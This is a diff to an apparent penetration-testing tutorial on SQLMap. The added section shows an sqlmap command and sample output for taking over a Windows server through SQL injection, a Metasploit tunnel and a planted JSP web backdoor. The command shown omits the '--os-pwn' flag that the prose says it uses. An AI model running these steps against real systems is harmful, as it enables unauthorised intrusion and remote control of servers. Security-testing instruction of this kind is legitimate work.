@@ -1,5 +1,5 @@
 # SQLMap SQL Injection Tool
-This module will cover the basics on using the SQL injection automation tool, SQLMap.
+This module will cover the basics on using the SQL injection automation tool, [SQLMap](http://sqlmap.org/). This tool automates the SQL injection process once a vulnerability is found and can also often discover unknown SQL vulnerabilities in web applications.
 ## Vulnerability Discovery
 This section will cover most of the vulnerability discovery methods that I have used during the penetration tests.
 ### Be Specific
@@ -26,6 +26,43 @@ SQLMap has the ability to utilize the MetaSploit Framework in attempt to take re
 1. A writeable directory on the target system
 2. What (web) programming language does the system support
 3. Where our Metasploit Framework is installed on our system
+
+Here is an exmaple of using the `--os-pwn` function in SQLMap:
+
+`root@wt:~# sqlmap -p id -u http://x.x.x.x:x/foo.do?id=45 --msf-path=/pwnt/exploitation/metasploit-framework/ --dbms=mysql --random-agent`
+
+The output from SQLMap would be something similar to,
+
+```
+[08:06:06] [INFO] testing MySQL
+[08:06:06] [INFO] confirming MySQL
+[08:06:06] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL < 5.0.0
+[08:06:06] [INFO] fingerprinting the back-end DBMS operating system
+[08:06:06] [INFO] the back-end DBMS operating system is Windows
+how do you want to establish the tunnel?
+[1] TCP: Metasploit Framework (default)
+[2] ICMP: icmpsh - ICMP tunneling
+> 1
+[08:06:09] [INFO] going to use a web backdoor to establish the tunnel
+which web application language does the web server support?
+[1] ASP (default)
+[2] ASPX
+[3] JSP
+[4] PHP
+> 3
+do you want sqlmap to further try to provoke the full path disclosure? [Y/n] n
+[08:06:13] [WARNING] unable to automatically retrieve the web server document root
+what do you want to use for writable directory?
+[1] common location(s) ('C:/xampp/htdocs/, C:/wamp/www/, C:/Inetpub/wwwroot/') (default)
+[2] custom location(s)
+[3] custom directory list file
+[4] brute force search
+> 2
+please provide a comma separate list of absolute directory paths: C:\WINDOWS\Temp
+```
+
+Where you can see that I have specified the writeable directory on the target server, the programming language used by the vulnerabile web application, and to use the Metasploit Framework tunnel.
 
 ### OS-Shell
 SQLMap has the ability to 
